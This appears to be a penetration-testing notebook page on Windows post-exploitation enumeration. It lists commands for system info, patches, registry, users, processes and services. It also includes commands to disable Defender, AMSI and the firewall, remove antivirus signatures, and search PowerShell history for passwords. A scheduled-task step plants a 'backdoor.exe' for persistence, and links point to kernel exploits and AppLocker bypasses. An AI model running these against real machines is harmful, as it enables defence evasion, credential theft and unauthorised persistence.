# Enumeration

## System Information

### general system information

```text
systeminfo
```

{% hint style="info" %}
one way to find out whether you are in a virtual environment or not is to check the output. for example the picture bellow is the output from a windows 10 machine in virtualbox: 
{% endhint %}

![](../../../.gitbook/assets/image%20%2867%29.png)

for OS name and version \( can add any other filter too \) :

```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

show information for a remote system \( used in domains \) :

```text
systeminfo /S [ip or hostname]
```

environment variables:

```text
set
Get-ChildItem Env: | ft Key,Value
```

### 

### get a list of installed hot fixes

```text
Get-HotFix
```

uninstall hot fixes \(need permission\):

```text
wusa /uninstall /kb:1234512
```



patchs and updates:

```text
wmic qfe
```

list all drivers:

```text
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

#### list kernel drivers

```text
driverquery | findstr Kernel
```





### Kernel Exploits

Extract the output of the systeminfo command:

```text
systeminfo > systeminfo.txt
```

Run [wesng](https://github.com/bitsadmin/wesng) to find potential exploits:

```text
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```

Cross-reference results with compiled exploits:

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

{% embed url="https://github.com/nomi-sec/PoC-in-GitHub" %}

​[https://github.com/abatchy17/WindowsExploit](https://github.com/abatchy17/WindowsExploits)





### SNMP configurations

check to see if there is any SNMP services running and find valid community strings:

```text
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s 
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

{% hint style="info" %}
for more information on windows registry hive and 'reg' commands refer to[ this section](%20https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/windows/security-component/windows-registry) of the book.
{% endhint %}

### check  powershell version

```text
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```

### navigate the registry with powershell

might require admin rights or higher privileges

```text
PS C:\> cd HKLM:\
PS HKLM:\> ls
```

### get last system boot time

```text
$os = Get-WmiObject win32_operatingsystem $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime) Write-Output ("Last boot: " + $os.ConvertToDateTime($os.LastBootUpTime))
You can also run this single line to get last boot time
systeminfo | more
```

### powershell history <a id="powershell-history"></a>

```text
ConsoleHost_history #Find the PATH where is saved
​
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### file system drives

```text
wmic logicaldisk get caption || fsutil fsinfo drives
driverquery | findstr "File System"
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### mount / volumes

```text
mountvol
```

## system logs and audit setting

### view system auditing setting

```text
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### check if system logs are stored somewhere else:

```text
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

view log categories:

```text
wevtutil enum-logs
wevtutil el
```

### configuration for System log:

```text
wevtutil gl System
```

general application logging info:

```text
wevtutil gli Application
```

### check credential guard:

```text
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```

### check cached credentials \(domain\):

```text
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## check for AVs

```text
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
Get-MpComputerStatus 
```

### windows defender

if you have privileges:

```text
# check status of Defender
PS C:\> Get-MpComputerStatus

# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
```

### applocker policy

```text
Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Applocker Bypass:

* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)

### check UAC

```text
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
```

## Network and Connections

```text
netstat -ano
ipconfig /all
arp -a
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

routing info:

```text
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### network shares

```text
net share
Find-DomainShare -ComputerDomain domain.local
```

### firewall

```text
# list firewall status and configs
netsh advfirewall firewall dump
# or 
netsh firewall show state
netsh firewall show config


# list blocked ports
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
```



## Users and Groups

Get current username

```text
echo %USERNAME% || whoami
$env:username
```

### list privileges

```text
whoami /priv
whoami /groups
```

### list all local users and groups

```text
net user
whoami /all
net localgroup
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-WmiObject -Class Win32_UserAccount
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

local user home directories

```text
dir C:\Users
Get-ChildItem C:\Users
```

### find local admins

```text
net localgroup Administrators 
```

list logon requirements \(useful for bruteforcing\)

```text
net accounts
```

get details about a user

```text
net user [username]
```

get details about a group

```text
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### logged users/sessions

```text
qwinsta
klist sessions
```

dump clipboard

```text
powershell -command "Get-Clipboard"
```



## Software and Processes

### check 'always install elevated' \(both should be enabled\):

```text
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

### list processes

```text
qprocess * 
tasklist
tasklist /m ntdll.dll
```

Find the list of processes launched by a user

```text
tasklist /fi "username eq userName"
```

Find the memory usage of a specific process

```text
tasklist /fi "pid eq processId"
tasklist /fi "pid eq 6544"
```

Get the list of services running in a process

```text
tasklist /svc /fi "pid eq processId"
tasklist /svc /fi "pid eq 624"
```

Find processes that are running a specified image file:

```text
tasklist /fi "imagename eq imageName"
tasklist /fi "imagename eq firefox.exe"
```

Find the process running a specific service

```text
tasklist /fi "services eq serviceName"
tasklist /fi "services eq webclient"
```

Kill a Task

```text
taskkill -f /pid 1337
taskkill /IM notepad.exe
```



### list processes running as "system"

```text
tasklist /v /fi "username eq system"
```

### installed programs \(might need higher privileges\)

```text
wmic product get name, version, vendor
```

show system-wide updates

```text
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

uninstall software \(if you have privileges\)

```text
wmic product where name="<NAME>" call uninstall /INTERACTIVE:OFF
```

### view/start/stop a service

```text
net start
wmic service list brief
sc query
Get-Service
sc start [name]
sc config [name] start= demand
sc stop [name]
```

get services real name with net start output

```text
sc getkeyname "service name"
```

### list scheduled tasks

```text
schtasks /query /fo LIST /v
```

add a startup scheduled task \(useful for persistence\)

```text
schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\users\Administrator\Desktop\backdoor.exe"

schtasks /create /tn "MyCustomTask" /sc onstart /tr "C:\users\Administrator\Desktop\backdoor.exe"
```

check the required privilege level for each service.

```text
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
```





















